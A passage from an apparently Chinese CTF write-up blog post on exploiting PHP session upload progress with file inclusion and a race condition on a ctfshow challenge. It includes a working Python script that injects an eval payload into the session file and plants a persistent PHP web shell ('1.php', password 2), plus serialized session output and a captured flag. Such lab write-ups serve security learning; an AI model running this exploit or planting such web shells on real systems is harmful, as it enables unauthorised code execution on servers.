<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_fl0g.php</span><br><span class="line">index.php</span><br><span class="line">|a:5:&#123;s:10:&quot;start_time&quot;;i:1662324411;s:14:&quot;content_length&quot;;i:455;s:15:&quot;bytes_processed&quot;;i:455;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:5:&quot;1.php&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1662324411;s:15:&quot;bytes_processed&quot;;i:455;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>看到没，这边就是序列化后的内容，和我们上面说的一样，会给$_SESSION数组带来一个由session.upload_progress.prefix+session.upload_progress.name组成的键名</p>
<ul>
<li>这边session.upload_progress.prefix&#x3D;’upload_progress_’</li>
<li>session.upload_progress.name&#x3D;fl0g.phpindex.php|a:5{s:10:”start_time”;i:1662324411;s:14:”content_length”;i:455;s:15:”bytes_processed”;i:455;s:4:”done”;b:0;s:5:”files”;a:1:{i:0;a:7:{s:10:”field_name”;s:4:”file”;s:4:”name”;s:5:”1.php”;s:8:”tmp_name”;N;s:5:”error”;i:0;s:4:”done”;b:0;s:10:”start_time”;i:1662324411;s:15:”bytes_processed”;i:455;}}}</li>
</ul>
<p>这边为什么session.upload_progress.name不是system(‘ls’)呢，这是因为system(‘ls’)被执行了，所以它的回显替代了它</p>
<h5 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h5><p>用同样的方法，我们把system(‘ls’)改为system(tac fl0g.php)，读取flag文件：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662325052779-0016903c-2066-44cf-b08c-71bdb16c8539.png#averageHue=%23f8f6f4&clientId=uae512af3-b93c-4&from=paste&height=506&id=u94426f16&name=image.png&originHeight=632&originWidth=1224&originalType=binary&ratio=1&rotation=0&showTitle=false&size=113131&status=done&style=none&taskId=u8cef6feb-00f9-4ac3-9644-6e1032a88c6&title=&width=979.2" alt="image.png"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 592</span><br><span class="line"></span><br><span class="line">upload_progress_$flag=&quot;ctfshow&#123;672ea89e-e1b9-40ea-84ff-81babe9d7346&#125;&quot;;</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @Last Modified time: 2020-09-16 11:25:00</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Date:   2020-09-16 11:24:37</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">|a:5:&#123;s:10:&quot;start_time&quot;;i:1662325033;s:14:&quot;content_length&quot;;i:462;s:15:&quot;bytes_processed&quot;;i:462;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:5:&quot;1.php&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1662325033;s:15:&quot;bytes_processe</span></span><br></pre></td></tr></table></figure>
<p>还是完全符合上述规则的！</p>
<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>这边我们原理还是一样的，只不过是用python脚本去跑一下了，都有注释：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url=<span class="string">&#x27;http://6e62b0ec-d001-4b09-a568-d105c92e3da6.challenge.ctf.show/&#x27;</span> <span class="comment">#引入url</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span> <span class="comment">#PHPSESSID的值</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span> <span class="comment">#将木马写入1.php</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    fileBytes=io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>) <span class="comment">#上传一个50k的文件</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=requests.post(url,data=&#123;</span><br><span class="line">            <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span> <span class="comment">#将这段代码写入session文件中</span></span><br><span class="line">        &#125;,</span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid <span class="comment">#同上，PHPSESSID的值</span></span><br><span class="line">        &#125;,</span><br><span class="line">         files=&#123;</span><br><span class="line">             <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes) <span class="comment">#上传这个文件单单只是为了抓个包，其他一点用都没有,可以删除</span></span><br><span class="line">         &#125;</span><br><span class="line">         )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid      <span class="comment">#包含session文件让第一个eval执行，然后执行第二个eval</span></span><br><span class="line">        &#125;)</span><br><span class="line">        response2=session.get(url+<span class="string">&#x27;1.php&#x27;</span>) <span class="comment">#获得回显</span></span><br><span class="line">        <span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;++++++perfect+++++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response2.status_code)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        evnet=threading.Event()       <span class="comment">#开启线程</span></span><br><span class="line">        <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:        <span class="comment">#多线程操作</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">        evnet.<span class="built_in">set</span>()           <span class="comment">#将信号标志设置为True，并唤醒所有处于等待状态的线程。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662325279337-9fa25dc2-e532-46be-a55d-97f347e65e2b.png#averageHue=%23615646&clientId=uae512af3-b93c-4&from=paste&height=456&id=uc42459a8&name=image.png&originHeight=627&originWidth=1047&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66866&status=done&style=none&taskId=u193fba4c-c3d6-4b53-ae50-6809118d9ee&title=&width=761.4545454545455" alt="image.png">出现perfect值的时候就说明已经将内容写入了1.php，这时候直接访问1.php,进行远程rce，这边rce的时候，py脚本一定要保持运行，进行条件竞争：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662325358069-dd3e2192-1cc8-4a41-ae24-d565b57cabf9.png#averageHue=%239f9f9f&clientId=uae512af3-b93c-4&from=paste&height=684&id=uce16e86b&name=image.png&originHeight=941&originWidth=1895&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74063&status=done&style=none&taskId=ub5158f83-6e04-467e-9ee8-1e4ba117026&title=&width=1378.1818181818182" alt="image.png"><br>得到结果</p>
<h5 id="浅分析"><a href="#浅分析" class="headerlink" title="浅分析"></a>浅分析</h5><p>这里利用的思路是在session文件中写入<br><code>&lt;?php eval($_POST[1]);?&gt;</code><br>然后再POST传递参数1:&#x3D;file_put_contents(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php’,’<?php eval($_POST[2]);?>‘);<br>将<code>&lt;?php eval($_POST[2]);?&gt;</code>写入1.php中<br>最后访问1.php去进行远程RCE，密码就是2<br>这就是整体的思路</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/入门/" class="tag">#入门</a><a href="/tags/新人同学/" class="tag">#新人同学</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">CTFSHOW-文件上传</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/%E4%B8%8D%E8%A6%81%E6%8D%89%E5%BC%84%E6%88%91%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6%EF%BC%9AH/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">不要捉弄我新人同学: H</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>